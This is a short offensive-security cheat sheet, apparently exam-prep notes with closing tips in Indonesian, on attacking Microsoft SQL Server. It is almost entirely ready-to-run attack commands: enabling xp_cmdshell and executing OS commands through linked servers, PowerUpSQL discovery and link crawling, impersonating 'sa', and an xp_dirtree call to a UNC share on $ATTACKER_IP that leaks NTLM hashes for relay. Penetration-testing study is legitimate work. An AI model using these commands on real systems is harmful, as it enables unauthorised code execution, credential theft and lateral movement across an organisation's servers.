---
name: "MSSQL Attacks — Linked Servers & Lateral Movement"
description: "MSSQL exploitation techniques including linked server enumeration, xp_cmdshell abuse, PowerUpSQL tooling, NTLM hash relay, and privilege escalation through SQL Server."
tags: [mssql, sql-server, linked-servers, lateral-movement, powerupsql, ntlm-relay]
---

# MSSQL Attacks

## Linked Servers — Attack Chain

```sql
-- Enumerate linked servers
SELECT * FROM sys.servers;

-- Execute via linked server
EXECUTE('xp_cmdshell ''whoami''') AT "LINKED_SERVER_NAME";

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

## PowerUpSQL (PowerShell)

```powershell
# Discover SQL servers
Get-SQLInstanceDomain -DomainController $DC

# Enumerate linked servers
Get-SQLServerLink -Instance $SQL_SERVER

# Crawl all linked servers
Get-SQLServerLinkCrawl -Instance $SQL_SERVER
```

## MSSQL Lateral Movement Pattern

```
SQL Server → Linked Server 1 → Linked Server 2 → RCE via xp_cmdshell
```

## NTLM Hash Relay via MSSQL

```sql
EXEC master..xp_dirtree '\\$ATTACKER_IP\share\'
-- Capture hash via Responder/ntlmrelayx
```

## Privilege Escalation

- **Impersonation**: `EXECUTE AS USER = 'sa'`
- **DBA privileges**: sysadmin → full control

## Best Practices

- Linked servers adalah salah satu vector paling powerfull di exam
- Selalu cek linked servers setelah dapat SQL access
- PowerUpSQL adalah tool wajib untuk MSSQL enumeration
- Jangan lupa cek xp_cmdshell status setelah enable
